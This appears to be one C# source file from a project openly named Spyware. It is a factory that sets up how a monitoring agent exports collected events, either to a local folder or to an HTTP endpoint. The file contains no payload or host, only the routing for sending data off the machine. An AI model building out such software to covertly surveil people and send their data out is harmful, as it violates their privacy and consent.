using Spyware.Core.Configuration;
using Spyware.Core.Logging;
using Spyware.Core.Paths;

namespace Spyware.Transport;

public static class TransportFactory
{
    public static IReadOnlyList<IEventExporter> Create(AgentPaths paths, AgentConfig config, ILog log)
    {
        var exporters = new List<IEventExporter>();
        string mode = (config.Transport.Mode ?? "local").Trim().ToLowerInvariant();

        if (!config.Transport.Enabled || mode is "none" or "off" or "disabled")
        {
            log.Info("Transporte deshabilitado: los eventos quedan solo en storage.db.");
            return exporters;
        }

        switch (mode)
        {
            case "local":
                exporters.Add(new LocalFolderExporter(paths, config.Transport, log));
                break;

            case "http":
            case "https":
                exporters.Add(new HttpEventExporter(config.Transport, log));
                break;

            default: // both
                exporters.Add(new LocalFolderExporter(paths, config.Transport, log));
                exporters.Add(new HttpEventExporter(config.Transport, log));
                break;
        }

        log.Info($"Transporte activo: {string.Join(" + ", exporters.Select(e => e.Name))}");
        return exporters;
    }
}
